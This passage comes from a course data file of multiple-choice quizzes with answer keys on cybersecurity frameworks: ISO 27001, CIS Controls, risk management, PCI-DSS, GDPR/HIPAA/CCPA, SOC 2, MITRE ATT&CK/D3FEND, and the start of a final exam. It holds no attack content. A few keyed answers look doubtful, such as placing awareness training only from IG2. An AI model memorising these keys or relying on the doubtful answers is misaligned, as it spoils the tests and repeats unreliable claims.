      { id: "cf-q3-3", question: "What is unique about ISO 27001 compared to other frameworks?", options: ["It's free", "It's the only framework offering formal third-party certification", "It only applies to government agencies", "It has no technical controls"], correctAnswer: 1, explanation: "ISO 27001 is the only major cybersecurity framework that offers formal third-party certification through accredited audit bodies." },
      { id: "cf-q3-4", question: "What cycle does ISO 27001 follow?", options: ["OODA Loop", "PDCA (Plan-Do-Check-Act)", "Kill Chain", "MITRE ATT&CK"], correctAnswer: 1, explanation: "ISO 27001 is built on the Plan-Do-Check-Act cycle for continual improvement of the ISMS." },
      { id: "cf-q3-5", question: "What is the Statement of Applicability (SoA)?", options: ["A job application for security roles", "A document listing all 93 controls with applicability and justification", "A network diagram", "An incident report"], correctAnswer: 1, explanation: "The SoA is the most critical ISO 27001 document — it lists all 93 Annex A controls with whether each is applicable, why, and implementation status." },
      { id: "cf-q3-6", question: "How often must ISO 27001 recertification audits occur?", options: ["Every year", "Every 2 years", "Every 3 years", "Every 5 years"], correctAnswer: 2, explanation: "Full recertification audits occur every 3 years, with annual surveillance audits in between to maintain certification." },
      { id: "cf-q3-7", question: "Which is NOT one of the four Annex A themes in 2022?", options: ["Organizational", "People", "Financial", "Technological"], correctAnswer: 2, explanation: "The four themes are Organizational, People, Physical, and Technological. Financial is not an Annex A theme." },
      { id: "cf-q3-8", question: "What new control in 2022 addresses preventing unauthorized data exfiltration?", options: ["A.8.12 Data Leakage Prevention", "A.5.1 Policies", "A.7.1 Physical Security", "A.6.1 Screening"], correctAnswer: 0, explanation: "A.8.12 Data Leakage Prevention is one of the 11 new controls in ISO 27001:2022." },
      { id: "cf-q3-9", question: "What does ALE stand for in quantitative risk analysis?", options: ["Annual Loss Expectancy", "Automated Log Evaluation", "Alert Level Escalation", "Asset Lifecycle Evaluation"], correctAnswer: 0, explanation: "ALE (Annualized Loss Expectancy) = SLE × ARO, the core formula for quantitative risk analysis." },
      { id: "cf-q3-10", question: "What is the Stage 1 audit?", options: ["The final certification audit", "A documentation review to assess readiness", "A penetration test", "Employee training verification"], correctAnswer: 1, explanation: "Stage 1 is the documentation review where auditors assess ISMS documentation and readiness for the Stage 2 implementation audit." },
      { id: "cf-q3-11", question: "Which ISO standard provides risk assessment guidelines?", options: ["ISO 9001", "ISO 27005", "ISO 14001", "ISO 22301"], correctAnswer: 1, explanation: "ISO 27005 provides guidelines for information security risk management, supporting ISO 27001's risk assessment requirements." },
      { id: "cf-q3-12", question: "Can you exclude Annex A controls from your ISMS?", options: ["No, all 93 are mandatory", "Yes, but only with documented and defensible justification", "Yes, without any justification needed", "Only the auditor can decide"], correctAnswer: 1, explanation: "Controls can be excluded from the SoA, but only with documented, defensible justification — 'we don't do that' is not sufficient." },
      { id: "cf-q3-13", question: "What is a nonconformity in an ISO audit?", options: ["A positive finding", "A deviation from standard requirements", "A suggestion for improvement", "A compliment from the auditor"], correctAnswer: 1, explanation: "A nonconformity is a deviation from standard requirements — either Major (systemic failure) or Minor (isolated issue)." },
      { id: "cf-q3-14", question: "What are the 3 pillars of information security (CIA)?", options: ["Cost, Integration, Automation", "Confidentiality, Integrity, Availability", "Compliance, Investigation, Authentication", "Control, Identity, Access"], correctAnswer: 1, explanation: "The CIA triad — Confidentiality, Integrity, and Availability — are the three fundamental pillars of information security." },
      { id: "cf-q3-15", question: "Which management review topic is mandatory in ISO 27001?", options: ["Employee birthday celebrations", "Status of actions from previous reviews and audit results", "Marketing campaign results", "Office renovation plans"], correctAnswer: 1, explanation: "Management reviews must cover status of previous actions, changes in issues, security performance feedback, audit results, and improvement opportunities." }
    ]
  },
  {
    quizId: "cf-q4",
    courseId: "cybersecurity-frameworks",
    title: "CIS Controls Quiz",
    description: "Test your knowledge of the 18 CIS Controls and implementation groups.",
    passingScore: 70,
    timeLimit: 20,
    questions: [
      { id: "cf-q4-1", question: "How many CIS Controls are there in version 8?", options: ["10", "14", "18", "20"], correctAnswer: 2, explanation: "CIS Controls v8 contains 18 controls organized into three implementation groups." },
      { id: "cf-q4-2", question: "What percentage of ATT&CK techniques does IG1 protect against?", options: ["About 30%", "About 50%", "About 77%", "100%"], correctAnswer: 2, explanation: "IG1 safeguards protect against approximately 77% of MITRE ATT&CK (sub-)techniques used in common attacks." },
      { id: "cf-q4-3", question: "Which CIS Control focuses on enterprise asset inventory?", options: ["Control 5", "Control 1", "Control 10", "Control 18"], correctAnswer: 1, explanation: "CIS Control 1: Inventory and Control of Enterprise Assets — knowing what's on your network is the foundation." },
      { id: "cf-q4-4", question: "What is IG1 also known as?", options: ["Advanced Security", "Essential Cyber Hygiene", "Network Defense", "Penetration Testing"], correctAnswer: 1, explanation: "IG1 is called Essential Cyber Hygiene — the minimum safeguards every organization should implement." },
      { id: "cf-q4-5", question: "After how many days of inactivity should accounts be disabled per CIS Controls?", options: ["15 days", "30 days", "45 days", "90 days"], correctAnswer: 2, explanation: "CIS Control 5.3 recommends disabling dormant accounts after 45 days of inactivity." },
      { id: "cf-q4-6", question: "Which CIS Control covers penetration testing?", options: ["Control 7", "Control 13", "Control 15", "Control 18"], correctAnswer: 3, explanation: "CIS Control 18: Penetration Testing — validating defenses through offensive security testing, part of IG3." },
      { id: "cf-q4-7", question: "What free tool does CIS provide for benchmarking?", options: ["Nessus", "CIS-CAT Lite", "Wireshark", "Splunk"], correctAnswer: 1, explanation: "CIS-CAT Lite is a free benchmarking tool that assesses system configurations against CIS Benchmarks." },
      { id: "cf-q4-8", question: "Which Implementation Group includes security awareness training?", options: ["IG1", "IG2", "IG3", "Not included in CIS Controls"], correctAnswer: 1, explanation: "CIS Control 14 (Security Awareness and Skills Training) starts in IG2, with basic awareness safeguards." },
      { id: "cf-q4-9", question: "What does CIS Control 3 cover?", options: ["Network monitoring", "Data Protection", "Penetration testing", "Email security"], correctAnswer: 1, explanation: "CIS Control 3: Data Protection — classifying and protecting sensitive data through encryption, DLP, and retention policies." },
      { id: "cf-q4-10", question: "How many safeguards are in IG1?", options: ["18", "36", "56", "153"], correctAnswer: 2, explanation: "IG1 contains 56 safeguards that form the essential cyber hygiene baseline for all organizations." },
      { id: "cf-q4-11", question: "Which CIS Control covers malware defenses?", options: ["Control 4", "Control 8", "Control 10", "Control 16"], correctAnswer: 2, explanation: "CIS Control 10: Malware Defenses — preventing and detecting malware across the enterprise." },
      { id: "cf-q4-12", question: "What do CIS Benchmarks provide?", options: ["General security advice", "Prescriptive configuration hardening guides for specific technologies", "Marketing materials", "Job descriptions"], correctAnswer: 1, explanation: "CIS Benchmarks are detailed, step-by-step hardening guides that specify exact configuration settings to secure systems." },
      { id: "cf-q4-13", question: "What are the two CIS Benchmark profile levels?", options: ["Basic and Advanced", "Level 1 (Practical) and Level 2 (Defense in Depth)", "Free and Premium", "Starter and Enterprise"], correctAnswer: 1, explanation: "Level 1 is practical security with minimal performance impact; Level 2 provides defense in depth for high-security environments." },
      { id: "cf-q4-14", question: "Which CIS Control requires MFA for externally-exposed applications?", options: ["Control 1", "Control 4", "Control 6", "Control 12"], correctAnswer: 2, explanation: "CIS Control 6.5 requires MFA for all externally-exposed enterprise applications and remote network access." },
      { id: "cf-q4-15", question: "How should organizations typically progress through Implementation Groups?", options: ["Implement all IGs simultaneously", "Start with IG3 and work backward", "Year 1: IG1, Year 2: add IG2, Year 3: add IG3", "IGs are not sequential"], correctAnswer: 2, explanation: "The typical progression is: Year 1 implement IG1, Year 2 add IG2 safeguards, Year 3 add IG3 — building on the foundation." }
    ]
  },
  {
    quizId: "cf-q5",
    courseId: "cybersecurity-frameworks",
    title: "Risk Management Quiz",
    description: "Evaluate your understanding of RMF, risk assessment, and third-party risk.",
    passingScore: 70,
    timeLimit: 20,
    questions: [
      { id: "cf-q5-1", question: "How many steps are in the NIST Risk Management Framework?", options: ["5", "6", "7", "8"], correctAnswer: 2, explanation: "NIST RMF has 7 steps: Prepare, Categorize, Select, Implement, Assess, Authorize, and Monitor." },
      { id: "cf-q5-2", question: "What does ATO stand for?", options: ["Automated Threat Operations", "Authorization to Operate", "Advanced Threat Oversight", "Annual Technical Overview"], correctAnswer: 1, explanation: "ATO (Authorization to Operate) is the decision by a senior official that a system is authorized to operate based on acceptable risk." },
      { id: "cf-q5-3", question: "In the FAIR methodology, what does Risk equal?", options: ["Threats × Vulnerabilities", "Loss Event Frequency × Loss Magnitude", "Assets × Threats", "Impact × Probability"], correctAnswer: 1, explanation: "In FAIR, Risk = Loss Event Frequency × Loss Magnitude, providing a quantitative financial measure of risk." },
      { id: "cf-q5-4", question: "What percentage of data breaches involve a third party?", options: ["About 20%", "About 40%", "About 60%", "About 80%"], correctAnswer: 2, explanation: "According to the Ponemon Institute, approximately 60% of data breaches involve a third party." },
      { id: "cf-q5-5", question: "Which is NOT a risk treatment strategy?", options: ["Mitigate", "Transfer", "Ignore", "Accept"], correctAnswer: 2, explanation: "The four strategies are Mitigate, Transfer, Avoid, and Accept. 'Ignore' is not a valid risk treatment — even acceptance requires documentation." },
      { id: "cf-q5-6", question: "What is FIPS 199 used for in RMF?", options: ["Encryption standards", "System categorization by impact level", "Audit procedures", "Network monitoring"], correctAnswer: 1, explanation: "FIPS 199 is used in RMF Step 2 to categorize information systems by impact level (Low, Moderate, High) for confidentiality, integrity, and availability." },
      { id: "cf-q5-7", question: "What does STRIDE stand for in threat modeling?", options: ["Security, Testing, Risk, Integration, Defense, Evaluation", "Spoofing, Tampering, Repudiation, Information Disclosure, DoS, Elevation of Privilege", "Standards, Threats, Regulations, Implementation, Detection, Enforcement", "None of the above"], correctAnswer: 1, explanation: "STRIDE categorizes threats: Spoofing, Tampering, Repudiation, Information Disclosure, Denial of Service, and Elevation of Privilege." },
      { id: "cf-q5-8", question: "What is residual risk?", options: ["Risk that was eliminated", "Risk remaining after controls are applied", "Risk that doesn't exist", "The first risk identified"], correctAnswer: 1, explanation: "Residual risk is the risk that remains after treatment measures have been applied. It must fall within the organization's risk appetite." },
      { id: "cf-q5-9", question: "What should a risk acceptance form include?", options: ["Only the risk description", "Risk ID, description, level, justification, owner, approval date, and review date", "Just the CISO's signature", "A network diagram"], correctAnswer: 1, explanation: "Risk acceptance forms must document the risk details, justification, compensating controls, risk owner approval, and scheduled review dates." },
      { id: "cf-q5-10", question: "What is the SIG questionnaire used for?", options: ["Employee satisfaction surveys", "Standardized vendor security assessments", "Incident response planning", "Software development reviews"], correctAnswer: 1, explanation: "The SIG (Standardized Information Gathering) questionnaire is a standardized tool for assessing third-party vendor security posture." },
      { id: "cf-q5-11", question: "Which NIST publication contains security controls for RMF?", options: ["SP 800-37", "SP 800-53", "SP 800-61", "SP 800-171"], correctAnswer: 1, explanation: "NIST SP 800-53 Rev. 5 contains over 1,000 security and privacy controls across 20 families used in the RMF." },
      { id: "cf-q5-12", question: "What contract clause is essential for third-party risk management?", options: ["Non-compete clause", "Right to audit clause", "Marketing rights clause", "Price guarantee clause"], correctAnswer: 1, explanation: "The right to audit clause allows organizations to assess their vendors' security controls and compliance." },
      { id: "cf-q5-13", question: "In quantitative risk analysis, what is SLE?", options: ["Security Level Evaluation", "Single Loss Expectancy", "System Lifecycle Efficiency", "Standard Log Entry"], correctAnswer: 1, explanation: "SLE (Single Loss Expectancy) = Asset Value × Exposure Factor — the expected monetary loss from a single incident." },
      { id: "cf-q5-14", question: "What is the most effective way to handle a risk that outweighs its business benefit?", options: ["Accept it", "Transfer it", "Avoid it", "Mitigate it"], correctAnswer: 2, explanation: "Risk avoidance — eliminating the risk source entirely — is appropriate when the risk outweighs the business benefit." },
      { id: "cf-q5-15", question: "How often should critical vendors be reassessed?", options: ["Only at contract signing", "Every 5 years", "Annually", "Never after initial assessment"], correctAnswer: 2, explanation: "Critical vendors should be reassessed annually, with continuous monitoring via security rating platforms between assessments." }
    ]
  },
  {
    quizId: "cf-q6",
    courseId: "cybersecurity-frameworks",
    title: "PCI-DSS Quiz",
    description: "Assess your knowledge of PCI-DSS requirements and compliance processes.",
    passingScore: 75,
    timeLimit: 20,
    questions: [
      { id: "cf-q6-1", question: "How many requirements does PCI-DSS have?", options: ["6", "10", "12", "15"], correctAnswer: 2, explanation: "PCI-DSS contains 12 requirements organized into 6 goals for protecting cardholder data." },
      { id: "cf-q6-2", question: "Which cardholder data element must NEVER be stored after authorization?", options: ["PAN", "Cardholder name", "CVV/CVC", "Expiration date"], correctAnswer: 2, explanation: "CVV/CVC, full track data, and PIN/PIN block must never be stored after authorization, even if encrypted." },
      { id: "cf-q6-3", question: "What is the minimum TLS version required by PCI-DSS?", options: ["TLS 1.0", "TLS 1.1", "TLS 1.2", "TLS 1.3"], correctAnswer: 2, explanation: "PCI-DSS requires TLS 1.2 or higher for all cardholder data transmission." },
      { id: "cf-q6-4", question: "What is the CDE?", options: ["Central Data Engine", "Cardholder Data Environment", "Compliance Documentation Evidence", "Cybersecurity Defense Endpoint"], correctAnswer: 1, explanation: "The CDE (Cardholder Data Environment) includes all people, processes, and technology that store, process, or transmit cardholder data." },
      { id: "cf-q6-5", question: "Which merchant level requires an annual on-site QSA audit?", options: ["Level 4", "Level 3", "Level 2", "Level 1"], correctAnswer: 3, explanation: "Level 1 merchants (>6M transactions/year) require annual on-site assessment by a Qualified Security Assessor (QSA)." },
      { id: "cf-q6-6", question: "What is the most effective way to reduce PCI scope?", options: ["Ignoring the requirements", "Network segmentation and tokenization", "Hiring more staff", "Using older software"], correctAnswer: 1, explanation: "Network segmentation isolates the CDE, and tokenization replaces cardholder data with non-sensitive tokens — both dramatically reduce scope." },
      { id: "cf-q6-7", question: "How often must ASV scans be performed?", options: ["Monthly", "Quarterly", "Semi-annually", "Annually"], correctAnswer: 1, explanation: "Approved Scanning Vendor (ASV) external vulnerability scans must be performed quarterly for all compliance levels." },
      { id: "cf-q6-8", question: "What PCI-DSS requirement covers access control?", options: ["Requirement 3", "Requirement 7", "Requirement 10", "Requirement 12"], correctAnswer: 1, explanation: "Requirement 7: Restrict access to system components and cardholder data by business need to know." },
      { id: "cf-q6-9", question: "What is SAQ A designed for?", options: ["All merchants", "Card-not-present merchants that fully outsource payment processing", "Brick-and-mortar stores", "Service providers"], correctAnswer: 1, explanation: "SAQ A is for card-not-present merchants that fully outsource payment processing — the simplest SAQ with only 22 questions." },
      { id: "cf-q6-10", question: "What new requirement did PCI-DSS v4.0 add for all CDE access?", options: ["Annual training", "MFA for all access to the CDE", "Weekly reports", "Physical guards"], correctAnswer: 1, explanation: "PCI-DSS v4.0 expanded MFA requirements to cover all access to the CDE, not just remote access." },
      { id: "cf-q6-11", question: "What are the potential fines for PCI-DSS non-compliance?", options: ["$100-$500", "$1,000-$5,000", "$5,000-$100,000 per month", "$1M minimum"], correctAnswer: 2, explanation: "PCI-DSS non-compliance fines range from $5,000 to $100,000 per month until the organization achieves compliance." },
      { id: "cf-q6-12", question: "What does PCI-DSS Requirement 10 cover?", options: ["Physical security", "Logging and monitoring all access to system components", "Software development", "Policy documentation"], correctAnswer: 1, explanation: "Requirement 10: Log and monitor all access to system components and cardholder data, with audit trails and SIEM." },
      { id: "cf-q6-13", question: "What is tokenization?", options: ["Creating encryption keys", "Replacing sensitive data with non-sensitive substitutes", "Network segmentation", "Employee training"], correctAnswer: 1, explanation: "Tokenization replaces cardholder data with a non-sensitive token that has no exploitable value if breached." },
      { id: "cf-q6-14", question: "How long must PCI-DSS audit logs be retained?", options: ["30 days", "90 days", "12 months", "7 years"], correctAnswer: 2, explanation: "PCI-DSS requires at least 12 months of audit trail history, with a minimum of 3 months immediately available for analysis." },
      { id: "cf-q6-15", question: "What is the customized approach in PCI-DSS v4.0?", options: ["Ignoring requirements", "An alternative way to meet requirements based on risk rather than prescriptive controls", "A cheaper compliance option", "A marketing feature"], correctAnswer: 1, explanation: "The customized approach in v4.0 allows organizations to meet the objective of a requirement using alternative controls justified by risk analysis." }
    ]
  },
  {
    quizId: "cf-q7",
    courseId: "cybersecurity-frameworks",
    title: "Data Privacy Regulations Quiz",
    description: "Test your understanding of GDPR, HIPAA, CCPA, and data protection principles.",
    passingScore: 70,
    timeLimit: 20,
    questions: [
      { id: "cf-q7-1", question: "How many principles does GDPR define?", options: ["5", "7", "10", "12"], correctAnswer: 1, explanation: "GDPR defines 7 principles: lawfulness/fairness/transparency, purpose limitation, data minimization, accuracy, storage limitation, integrity/confidentiality, and accountability." },
      { id: "cf-q7-2", question: "Within how many hours must a GDPR breach be reported to authorities?", options: ["24 hours", "48 hours", "72 hours", "7 days"], correctAnswer: 2, explanation: "GDPR requires breach notification to the supervisory authority within 72 hours of becoming aware of the breach." },
      { id: "cf-q7-3", question: "What is the maximum GDPR fine?", options: ["€1 million", "€10 million", "€20 million or 4% of global annual turnover", "€100 million"], correctAnswer: 2, explanation: "The maximum GDPR penalty is €20 million or 4% of global annual turnover, whichever is greater." },
      { id: "cf-q7-4", question: "What does PHI stand for in HIPAA?", options: ["Personal Health Information", "Protected Health Information", "Private Hospital Index", "Public Health Indicator"], correctAnswer: 1, explanation: "PHI stands for Protected Health Information — any individually identifiable health information." },
      { id: "cf-q7-5", question: "What three types of safeguards does the HIPAA Security Rule require?", options: ["Network, Application, Cloud", "Administrative, Physical, Technical", "Legal, Financial, Operational", "Preventive, Detective, Corrective"], correctAnswer: 1, explanation: "The HIPAA Security Rule requires Administrative, Physical, and Technical safeguards to protect ePHI." },
      { id: "cf-q7-6", question: "What revenue threshold triggers CCPA applicability?", options: ["$10 million", "$25 million", "50 million", "$100 million"], correctAnswer: 1, explanation: "CCPA applies to businesses with annual gross revenue over $25 million (among other triggers)." },
      { id: "cf-q7-7", question: "What is the 'Right to be Forgotten'?", options: ["Right to change your name", "Right to request deletion of personal data (GDPR right to erasure)", "Right to forget your password", "Right to delete your social media"], correctAnswer: 1, explanation: "The Right to be Forgotten (right to erasure) allows data subjects to request deletion of their personal data under GDPR." },
      { id: "cf-q7-8", question: "What did CPRA add to California privacy law?", options: ["Criminal penalties", "Sensitive personal information category and the CPPA enforcement agency", "International applicability", "Blockchain requirements"], correctAnswer: 1, explanation: "CPRA added the 'sensitive personal information' category, created the California Privacy Protection Agency, and strengthened existing rights." },
      { id: "cf-q7-9", question: "What is a BAA in HIPAA?", options: ["Business Audit Agreement", "Business Associate Agreement", "Breach Assessment Acknowledgment", "Basic Access Authorization"], correctAnswer: 1, explanation: "A BAA (Business Associate Agreement) is required for any vendor handling ePHI, defining their security obligations." },
      { id: "cf-q7-10", question: "When must a DPIA be conducted under GDPR?", options: ["For all data processing", "When processing is likely to result in high risk to individuals' rights", "Only for government organizations", "Only after a breach occurs"], correctAnswer: 1, explanation: "DPIAs are mandatory when processing is 'likely to result in a high risk' to data subjects' rights and freedoms." },
      { id: "cf-q7-11", question: "How many US states had comprehensive privacy laws by 2024?", options: ["Only California", "5 states", "15+ states", "All 50 states"], correctAnswer: 2, explanation: "By 2024, 15+ US states had enacted comprehensive privacy laws, creating a complex patchwork of requirements." },
      { id: "cf-q7-12", question: "What is 'Privacy by Design'?", options: ["Designing beautiful privacy notices", "Embedding privacy into system design proactively rather than retroactively", "A software tool", "A HIPAA requirement"], correctAnswer: 1, explanation: "Privacy by Design embeds privacy into the design and architecture of systems and business practices from the start." },
      { id: "cf-q7-13", question: "What breach size triggers HIPAA notification to media?", options: ["Any breach", "100+ individuals", "500+ individuals in a state", "1000+ individuals"], correctAnswer: 2, explanation: "HIPAA requires media notification when a breach affects 500 or more individuals in a single state or jurisdiction." },
      { id: "cf-q7-14", question: "Which GDPR lawful basis is used for processing a purchase order?", options: ["Consent", "Contract", "Legitimate interests", "Vital interests"], correctAnswer: 1, explanation: "Processing necessary for contract performance — such as processing a purchase order — uses the 'contract' lawful basis." },
      { id: "cf-q7-15", question: "How many countries have data protection laws globally?", options: ["About 30", "About 70", "About 137+", "All 195"], correctAnswer: 2, explanation: "Over 137 countries have enacted data protection laws, reflecting the global trend toward privacy regulation." }
    ]
  },
  {
    quizId: "cf-q8",
    courseId: "cybersecurity-frameworks",
    title: "SOC 2 & Cloud Security Quiz",
    description: "Evaluate your knowledge of SOC 2 TSCs and cloud security frameworks.",
    passingScore: 70,
    timeLimit: 20,
    questions: [
      { id: "cf-q8-1", question: "How many Trust Service Criteria does SOC 2 have?", options: ["3", "5", "7", "10"], correctAnswer: 1, explanation: "SOC 2 has 5 Trust Service Criteria: Security, Availability, Processing Integrity, Confidentiality, and Privacy." },
      { id: "cf-q8-2", question: "Which TSC is always required in a SOC 2 report?", options: ["Availability", "Privacy", "Security (Common Criteria)", "Processing Integrity"], correctAnswer: 2, explanation: "Security (Common Criteria) is always required — it's the foundation included in every SOC 2 report." },
      { id: "cf-q8-3", question: "What is the minimum observation period for SOC 2 Type II?", options: ["1 month", "3 months", "6 months", "12 months"], correctAnswer: 1, explanation: "SOC 2 Type II requires a minimum 3-month observation period, though 6-12 months is typical." },
      { id: "cf-q8-4", question: "What is the main difference between Type I and Type II?", options: ["Cost only", "Type I is design at a point in time; Type II tests effectiveness over a period", "Type II is easier", "There is no difference"], correctAnswer: 1, explanation: "Type I evaluates control design at a specific date, while Type II tests both design and operating effectiveness over a period of time." },
      { id: "cf-q8-5", question: "Who can issue a SOC 2 report?", options: ["Any security company", "Licensed CPA firms only", "The company itself", "Government regulators"], correctAnswer: 1, explanation: "SOC 2 reports can only be issued by licensed CPA (Certified Public Accountant) firms — it's an attestation, not a certification." },
      { id: "cf-q8-6", question: "What does the shared responsibility model define?", options: ["How to share passwords", "Division of security responsibilities between cloud provider and customer", "Shared office spaces", "Open-source licensing"], correctAnswer: 1, explanation: "The shared responsibility model defines what the cloud provider secures (infrastructure) vs. what the customer secures (data, applications, configurations)." },
      { id: "cf-q8-7", question: "In IaaS, who is responsible for OS patching?", options: ["The cloud provider", "The customer", "No one", "The government"], correctAnswer: 1, explanation: "In IaaS, the customer is responsible for OS patching, application security, and data protection. The provider handles physical and network infrastructure." },
      { id: "cf-q8-8", question: "What is the CSA Cloud Controls Matrix?", options: ["A compliance certification", "A control framework with 197 objectives specifically for cloud computing", "A network monitoring tool", "An encryption standard"], correctAnswer: 1, explanation: "The CCM is a cybersecurity control framework with 197 control objectives across 17 domains designed specifically for cloud computing." },
      { id: "cf-q8-9", question: "What is the CAIQ?", options: ["Cloud Access Intelligence Query", "Consensus Assessments Initiative Questionnaire", "Compliance Automated Inspection Queue", "Cloud Audit Internal Qualification"], correctAnswer: 1, explanation: "The CAIQ (Consensus Assessments Initiative Questionnaire) is a standardized questionnaire for documenting cloud provider security posture." },
      { id: "cf-q8-10", question: "What AWS service provides centralized security findings?", options: ["AWS Lambda", "AWS Security Hub", "Amazon S3", "AWS CloudFormation"], correctAnswer: 1, explanation: "AWS Security Hub provides a centralized view of security findings from multiple AWS services and third-party tools." },
      { id: "cf-q8-11", question: "How many Common Criteria (CC) categories are in SOC 2 Security?", options: ["5", "7", "9", "12"], correctAnswer: 2, explanation: "The Security criteria are organized into 9 CC categories: Control Environment through Risk Mitigation." },
      { id: "cf-q8-12", question: "What is the typical cost range for a SOC 2 Type II audit?", options: ["$5K-$10K", "$30K-$100K+", "$500K-$1M", "Free"], correctAnswer: 1, explanation: "SOC 2 Type II audits typically cost between $30K-$100K+, depending on scope and complexity." },
      { id: "cf-q8-13", question: "Which CSA STAR level involves third-party audit?", options: ["Level 1", "Level 2", "Level 3", "All levels"], correctAnswer: 1, explanation: "CSA STAR Level 2 involves independent third-party assessment through CSA STAR Certification or Attestation." },
      { id: "cf-q8-14", question: "What compliance automation tool helps with SOC 2 readiness?", options: ["Microsoft Word", "Vanta", "Photoshop", "Slack"], correctAnswer: 1, explanation: "Vanta and similar platforms (Drata, Secureframe) automate evidence collection and continuously monitor controls for SOC 2 readiness." },
      { id: "cf-q8-15", question: "In SaaS, what does the customer remain responsible for?", options: ["Physical security", "Network infrastructure", "Data classification and access management", "Server patching"], correctAnswer: 2, explanation: "Even in SaaS, customers remain responsible for data classification, user access management, and how they use the service." }
    ]
  },
  {
    quizId: "cf-q9",
    courseId: "cybersecurity-frameworks",
    title: "MITRE & Cross-Mapping Quiz",
    description: "Test your ability to map controls across frameworks using ATT&CK and D3FEND.",
    passingScore: 75,
    timeLimit: 20,
    questions: [
      { id: "cf-q9-1", question: "What is the primary purpose of mapping controls to MITRE ATT&CK?", options: ["To create marketing materials", "To identify detection gaps against real adversary techniques", "To replace existing frameworks", "To train new employees"], correctAnswer: 1, explanation: "Mapping controls to ATT&CK reveals which adversary techniques your controls can detect, prevent, or mitigate — and where gaps exist." },
      { id: "cf-q9-2", question: "What does D3FEND stand for?", options: ["Data Defense Framework for Enterprise Network Defense", "Detection, Denial, and Disruption Framework Empowering Network Defense", "Digital Defense for Enterprise Networks and Domains", "Dynamic Defense Framework for Endpoint Detection"], correctAnswer: 1, explanation: "D3FEND stands for Detection, Denial, and Disruption Framework Empowering Network Defense." },
      { id: "cf-q9-3", question: "What are the D3FEND tactics?", options: ["Identify, Protect, Detect, Respond, Recover", "Harden, Detect, Isolate, Deceive, Evict", "Plan, Do, Check, Act", "Scout, Shield, Strike, Secure"], correctAnswer: 1, explanation: "D3FEND tactics are: Harden (reduce attack surface), Detect (identify activity), Isolate (contain), Deceive (mislead), Evict (remove)." },
      { id: "cf-q9-4", question: "What tool visualizes ATT&CK coverage as a heatmap?", options: ["Wireshark", "ATT&CK Navigator", "Nmap", "Splunk"], correctAnswer: 1, explanation: "The ATT&CK Navigator creates visual heatmaps showing control coverage across all tactics and techniques." },
      { id: "cf-q9-5", question: "What is the main benefit of cross-framework mapping?", options: ["It makes frameworks longer", "One control can satisfy multiple framework requirements, reducing duplication", "It eliminates the need for audits", "It replaces all frameworks with one"], correctAnswer: 1, explanation: "Cross-mapping shows that one well-implemented control can satisfy requirements from multiple frameworks simultaneously." },
      { id: "cf-q9-6", question: "Which MFA control maps to ATT&CK T1078 (Valid Accounts)?", options: ["Network segmentation", "Multi-factor authentication", "Data encryption", "Log monitoring"], correctAnswer: 1, explanation: "MFA directly prevents T1078 (Valid Accounts) by requiring additional authentication factors beyond stolen credentials." },
      { id: "cf-q9-7", question: "What score indicates no ATT&CK technique coverage?", options: ["Score 4", "Score 2", "Score 1", "Score 0"], correctAnswer: 3, explanation: "Score 0 (red) indicates no coverage — no detection or prevention controls exist for that technique." },
      { id: "cf-q9-8", question: "What is a unified control catalog?", options: ["A list of all security tools", "A single document mapping one control to multiple framework requirements", "An employee directory", "A vulnerability scan report"], correctAnswer: 1, explanation: "A unified control catalog documents each control with mappings to all applicable frameworks (NIST CSF, ISO 27001, CIS, PCI-DSS, etc.)." },
      { id: "cf-q9-9", question: "Which GRC tool automates framework cross-mapping?", options: ["Microsoft Excel (manual)", "Drata, Vanta, or OneTrust", "Notepad", "Wireshark"], correctAnswer: 1, explanation: "GRC tools like Drata, Vanta, and OneTrust automate cross-framework mapping and centralize compliance management." },
      { id: "cf-q9-10", question: "How does D3FEND complement ATT&CK?", options: ["It replaces ATT&CK", "It provides defensive countermeasures for ATT&CK offensive techniques", "It's the same framework with a different name", "It only works for network defense"], correctAnswer: 1, explanation: "D3FEND provides the defensive counterpart — for each ATT&CK offensive technique, D3FEND lists specific countermeasures." },
      { id: "cf-q9-11", question: "What should be the first step in building a unified control framework?", options: ["Buy a GRC tool", "Choose a primary framework as your foundation", "Hire a consultant", "Implement all controls immediately"], correctAnswer: 1, explanation: "The first step is choosing a primary framework (usually NIST CSF or ISO 27001) as the foundation to map all others against." },
      { id: "cf-q9-12", question: "Which framework requirement is unique to GDPR and doesn't overlap with others?", options: ["Asset inventory", "Data Protection Impact Assessments (DPIAs)", "Access control", "Incident response"], correctAnswer: 1, explanation: "DPIAs are a GDPR-specific requirement that doesn't directly overlap with PCI-DSS, SOC 2, or CIS Controls." },
      { id: "cf-q9-13", question: "What ATT&CK coverage score means high-fidelity detection with automated response?", options: ["Score 1", "Score 2", "Score 3", "Score 4"], correctAnswer: 2, explanation: "Score 3 indicates high-fidelity detection with automated response capabilities for an ATT&CK technique." },
      { id: "cf-q9-14", question: "How should gaps in ATT&CK coverage be prioritized?", options: ["Address all gaps equally", "Based on technique prevalence, impact, and remediation feasibility", "Only address Tier 1 gaps", "Ignore them"], correctAnswer: 1, explanation: "Prioritize gaps based on how frequently threat actors use the technique, the potential impact, and the cost/feasibility of implementing detection." },
      { id: "cf-q9-15", question: "What does a D3FEND knowledge graph connect?", options: ["Only offensive techniques", "Digital artifacts, defensive techniques, offensive techniques, and technologies", "Employee profiles", "Network devices"], correctAnswer: 1, explanation: "The D3FEND knowledge graph connects digital artifacts, offensive techniques, defensive countermeasures, and implementing technologies." }
    ]
  },
  {
    quizId: "cf-q10",
    courseId: "cybersecurity-frameworks",
    title: "Cybersecurity Frameworks Certification Exam",
    description: "Comprehensive final exam covering all 10 modules. Pass with 80% to earn your certificate.",
    passingScore: 80,
    timeLimit: 60,
    questions: [
      { id: "cf-q10-1", question: "What is the primary purpose of cybersecurity governance?", options: ["Network monitoring", "Aligning security with business strategy and ensuring accountability", "Writing source code", "Physical building security"], correctAnswer: 1, explanation: "Governance ensures security efforts strategically support business objectives with clear accountability and oversight." },
      { id: "cf-q10-2", question: "How many core functions does NIST CSF v2.0 have?", options: ["4", "5", "6", "8"], correctAnswer: 2, explanation: "NIST CSF v2.0 has 6 functions: Govern, Identify, Protect, Detect, Respond, and Recover." },
      { id: "cf-q10-3", question: "Which framework offers formal third-party certification?", options: ["NIST CSF", "CIS Controls", "ISO 27001", "MITRE ATT&CK"], correctAnswer: 2, explanation: "ISO 27001 is the only major cybersecurity framework offering formal third-party certification." },
